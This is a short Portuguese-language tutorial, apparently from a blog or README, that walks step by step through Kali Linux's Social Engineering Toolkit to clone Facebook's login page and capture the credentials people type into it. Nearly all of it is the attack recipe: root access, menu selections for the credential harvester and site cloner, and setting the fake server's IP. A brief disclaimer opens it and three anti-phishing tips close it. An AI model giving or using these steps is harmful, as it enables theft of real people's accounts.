# Configurando o Phishing no Kali Linux
**Atenção:** Este guia é apenas para fins educacionais e de conscientização sobre segurança cibernética. O uso indevido pode ser ilegal e resultar em penalidades graves.

### 1. Obter Acesso Root
```bash
sudo su
```

### 2. Iniciar o Social Engineering Toolkit (SET)
```bash
setoolkit
```

### 3. Selecionar o Tipo de Ataque
Escolha a opção de ataques de engenharia social:
```bash
1) Social-Engineering Attacks
```

### 4. Selecionar o Vetor de Ataque
```bash
2) Web Site Attack Vectors
```

### 5. Escolher o Método de Captura de Credenciais
```bash
3) Credential Harvester Attack Method
```

### 6. Escolher o Método de Clonagem de Site
```bash
2) Site Cloner
```

### 7. Obter o Endereço IP da Máquina para Servidor Fake
```bash
ifconfig
```
Copie o endereço IP da interface correta.

### 8. Definir a URL do Site a ser Clonado
Por exemplo, para clonar o Facebook:
```bash
http://www.facebook.com
```

### 9. Captura de Credenciais
Caso um usuário insira credenciais falsas, elas aparecerão no terminal do Kali Linux.

## Como se Proteger de Phishing
- Sempre verifique a URL dos sites antes de inserir credenciais.
- Utilize autenticação em dois fatores.
- Nunca clique em links suspeitos recebidos por e-mail ou mensagens.
